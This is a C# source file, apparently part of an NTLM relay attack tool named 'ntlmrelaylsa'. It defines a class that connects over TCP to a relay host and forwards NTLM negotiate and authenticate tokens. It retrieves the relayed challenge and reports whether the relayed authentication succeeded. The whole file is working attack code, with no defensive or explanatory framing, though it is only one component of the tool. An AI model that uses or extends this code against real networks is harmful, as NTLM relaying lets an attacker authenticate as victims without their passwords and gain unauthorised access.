using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace ntlmrelaylsa {
    public class NtlmRelayChallengeResponse {
        public byte[] OriginalChallenge { get; set; }
        public byte[] RelayHostChallenge { get; set; }

        TcpClient client;
        
        public NtlmRelayChallengeResponse(string host, ushort port) {
            client = new TcpClient(host, port);                        
        }

        private byte[] SendToken(byte[] token, bool expectResponse) {

            var relayStream = client.GetStream();
            BinaryWriter bw = new BinaryWriter(relayStream);
            BinaryReader br = new BinaryReader(relayStream);

            bw.Write((short)token.Length);
            bw.Write(token);

            if (expectResponse) {
                var response_size = br.ReadUInt16();
                return br.ReadBytes(response_size);
            } else {
                return null;
            }        
        }

        public byte[] GetChallengeToken(byte[] neg_token) {
            try {
                return SendToken(neg_token, true);
            }catch(Exception) {
                return new byte[] { };
            }
        }

        public bool SendAuthenticateToken(byte[] auth_token) {
            try {
                var response = SendToken(auth_token, true);
                return response[0] == 1;
            } catch (Exception) {
                return false;
            }
        }
    }
}
